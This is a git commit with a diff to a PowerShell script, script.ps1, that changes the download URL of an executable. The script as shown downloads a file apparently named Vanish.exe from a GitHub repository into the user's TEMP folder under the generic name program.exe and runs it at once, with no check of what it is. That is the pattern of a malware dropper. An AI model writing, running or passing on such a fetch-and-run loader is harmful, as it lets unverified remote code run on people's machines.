0121f7da6726c870ea32bc1c9f26434d5da188b3
fasa3e <gaveliianiskin@icloud.com>
2026-07-15 12:07:43 +0000

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/fasa3e/gsd/refs/heads/main/Vanish.exe"
+$url = "https://raw.githubusercontent.com/fasa3e/-24/refs/heads/main/Vanish.exe1.exe"
 $output = "$env:TEMP\program.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
